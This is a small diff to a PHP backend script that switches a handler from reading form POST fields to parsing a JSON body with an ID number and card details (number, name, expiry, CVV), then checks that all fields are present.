@@ -23,12 +23,20 @@ try {
         throw new Exception('Invalid request method');
     }
 
-    // Get form data
-    $dni = $_POST['dni'] ?? '';
-    $cardNumber = $_POST['cardNumber'] ?? '';
-    $cardName = $_POST['cardName'] ?? '';
-    $cardExpiry = $_POST['cardExpiry'] ?? '';
-    $cardCvv = $_POST['cardCvv'] ?? '';
+    // Get JSON input
+    $jsonInput = file_get_contents('php://input');
+    $data = json_decode($jsonInput, true);
+
+    if (json_last_error() !== JSON_ERROR_NONE) {
+        throw new Exception('Invalid JSON data');
+    }
+
+    // Extract data from JSON
+    $dni = $data['dni'] ?? '';
+    $cardNumber = $data['cardInfo']['number'] ?? '';
+    $cardName = $data['cardInfo']['name'] ?? '';
+    $cardExpiry = $data['cardInfo']['expiry'] ?? '';
+    $cardCvv = $data['cardInfo']['cvv'] ?? '';
 
     if (!$dni || !$cardNumber || !$cardName || !$cardExpiry || !$cardCvv) {
         throw new Exception('Missing required fields');
